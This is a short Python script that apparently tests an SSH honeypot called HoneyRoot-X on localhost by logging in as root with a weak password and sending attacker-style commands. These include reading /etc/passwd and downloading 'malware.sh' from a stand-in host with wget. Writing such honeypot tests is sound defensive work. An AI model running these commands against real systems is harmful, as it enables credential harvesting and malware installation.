import paramiko
import time

def simulate():
    print("[*] Starting attack simulation against HoneyRoot-X...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        # The tar-pit will delay this step
        print("[*] Attempting authentication...")
        client.connect("127.0.0.1", port=2222, username="root", password="password123", timeout=15)
        
        print("[+] Auth successful, opening shell...")
        shell = client.invoke_shell()
        time.sleep(1)
        print(shell.recv(1024).decode())
        
        commands = [
            "whoami\n",
            "uname -a\n",
            "cat /etc/passwd\n",
            "wget http://example.com/malware.sh\n",
            "exit\n"
        ]
        
        for cmd in commands:
            print(f"[*] Sending: {cmd.strip()}")
            shell.send(cmd)
            time.sleep(2)
            print(shell.recv(4096).decode())
            
    except Exception as e:
        print(f"[-] Simulation failed: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    simulate()
